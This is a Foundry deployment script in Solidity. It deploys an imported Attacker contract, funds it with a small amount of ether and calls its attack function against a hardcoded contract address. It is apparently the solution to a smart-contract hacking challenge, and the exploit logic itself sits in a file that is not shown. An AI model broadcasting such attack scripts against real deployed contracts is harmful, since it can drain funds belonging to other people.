// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Attacker} from "../src/Attacker.sol";

contract DeployScript is Script {

    function run() public {
        address payable target = payable(0x4b241Ad3bce67725776F333Ef013F27C7ad7CfEf);

        vm.startBroadcast();

        Attacker attacker = new Attacker();
        (bool success,) = address(attacker).call{value: 0.0001 ether}("");
        if (!success)
            revert();

        attacker.attack(target);

        vm.stopBroadcast();
    }
}
